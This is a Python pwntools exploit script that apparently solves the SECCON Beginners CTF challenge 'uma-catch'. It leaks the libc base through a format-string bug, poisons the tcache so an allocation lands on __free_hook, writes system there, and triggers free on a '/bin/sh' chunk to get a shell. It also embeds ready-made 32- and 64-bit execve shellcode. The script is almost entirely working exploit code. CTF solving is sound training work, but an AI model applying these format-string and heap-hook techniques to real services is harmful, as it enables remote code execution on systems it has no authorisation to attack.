from pwn import *
context.log_level = 'debug'
context.arch = 'amd64'
context.terminal = ['tmux', 'split-window', '-h']

TARGET = './chall'
HOST = 'uma-catch.quals.beginners.seccon.jp'
PORT = 4101


elf = ELF(TARGET)
def start():
	if not args.R:
		print("local")
		# return process(TARGET)
		return process(TARGET, env={"LD_PRELOAD":"./libc.so.6"})
		# return process(TARGET, stdout=process.PTY, stdin=process.PTY)
	else:
		print("remote")
		return remote(HOST, PORT)

def get_base_address(proc):
	lines = open("/proc/{}/maps".format(proc.pid), 'rb').readlines()
	for line in lines :
		if TARGET[2:] in line.split('/')[-1] :
			break
	return int(line.split('-')[0], 16)
	# return int(open("/proc/{}/maps".format(proc.pid), 'rb').readlines()[0].split('-')[0], 16)

def debug(proc, breakpoints):
	script = "handle SIGALRM ignore\n"
	PIE = get_base_address(proc)
	script += "set $base = 0x{:x}\n".format(PIE)
	for bp in breakpoints:
		script += "b *0x%x\n"%(PIE+bp)
	script += "c"
	gdb.attach(proc, gdbscript=script)

def dbg(val): print("\t-> %s: 0x%x" % (val, eval(val)))

_32_SHELLCODE = "\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x50\x53\x89\xe1\xb0\x0b\x31\xd2\xcd\x80"
_64_SHELLCODE = "\x6a\x3b\x58\x48\x99\x48\xbf\x2f\x62\x69\x6e\x2f\x2f\x73\x68\x52\x57\x48\x89\xe7\x52\x57\x48\x89\xe6\x0f\x05"

def a(idx, color='bay'):
	r.sendlineafter('> ', '1')
	r.sendlineafter('> ', str(idx))
	r.sendlineafter('> ', color)

def e(idx, name):
	r.sendlineafter('> ', '2')
	r.sendlineafter('> ', str(idx))
	r.sendlineafter('> ', name)

def s(idx):
	r.sendlineafter('> ', '3')
	r.sendlineafter('> ', str(idx))

def d(idx):
	r.sendlineafter('> ', '5')
	r.sendlineafter('> ', str(idx))

r = start()
if args.D:
	debug(r, [])

a(0)
a(1)
e(0, '%11$p')
s(0)
leak = int(r.recvuntil('\n'), 16)
dbg('leak')

base = leak -0x21bf7
dbg('base')
fh = base + 0x3ed8e8
system = base + 0x4f550

d(1)
d(0)
e(0, p64(fh-8))

a(0)
a(1)
e(1, flat("/bin/sh\x00", system))
d(1)



r.interactive()
r.close()
